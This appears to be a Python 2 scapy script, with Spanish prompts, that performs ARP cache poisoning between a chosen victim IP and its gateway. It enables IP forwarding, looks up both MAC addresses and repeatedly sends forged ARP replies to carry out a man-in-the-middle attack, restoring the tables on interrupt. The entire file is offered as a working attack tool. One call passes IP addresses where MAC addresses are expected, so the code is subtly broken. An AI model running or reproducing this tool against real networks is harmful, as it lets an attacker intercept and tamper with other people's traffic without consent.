#!/usr/bin/env python
from scapy.all import *
import sys
import os
import time
import argparse
def argumentos():
    parser=argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="ESpecifica IP objetivo")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Especifica IP gateway")
    parser.add_argument("-i", "--interface", dest="interface", help="Especifica Interfaz")
    return parser.parse_args()
arguments= argumentos()
victimIP=arguments.target
gateIP=arguments.gateway
interface=arguments.interface
if not victimIP:
    print 'Introduce una IP objetivo'
    print 'Sintaxis: comando -t <objetivo> -g <gateway> -i <interfaz>'
    sys.exit(1)
if not gateIP:
    print 'Introduce una IP de gateway'
    print 'Sintaxis: comando -t <objetivo> -g <gateway> -i <interfaz>'
    sys.exit(1)
if not interface:
    print 'Introduce la interfaz'
    print 'Sintaxis: comando -t <objetivo> -g <gateway> -i <interfaz>'
    sys.exit(1)

print '\n Habilitando ip forwarding'
print '\n Envenenando las tablas ARP'
os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

def obt_mac(IP):
    conf.verb = 0
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout=2, iface=interface)
    for send,rec in ans:
        return rec.sprintf("%Ether.src%")

victimMAC = obt_mac(victimIP)
gateMAC = obt_mac(gateIP)

def repararARP():
    
    print '\nRestaurando ARP objetivos'
    
    send(ARP(op = 2,pdst = gateIP,psrc=victimIP,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=victimMAC),count=20)
    send(ARP(op = 2,pdst = victimIP,psrc=gateIP,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateMAC),count=20)
    print 'Desactivando forwarding'
    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
    sys.exit(0)

def poison(gatem, vicm):
    send(ARP(op = 2, pdst = victimIP, psrc=gateIP,hwdst=vicm),count=20)
    send(ARP(op = 2, pdst = gateIP, psrc=victimIP,hwdst=gatem),count=20)
    
def main():
    try:
        print "La mac de la victima ---> "+victimMAC
    except Exception:
        os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
        print 'No se ha podido obtener la MAC de la victima'
        sys.exit(1)
    try:
        print "La mac del gateway ---> "+gateMAC
    except Exception:
        os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
        print 'NO se ha podido obtener la MAC de la gateway'
        sys.exit(1)
    while 1:
        try:
            poison(gateIP,victimIP)
            time.sleep(1.5)
        except KeyboardInterrupt:
            repararARP()

main()

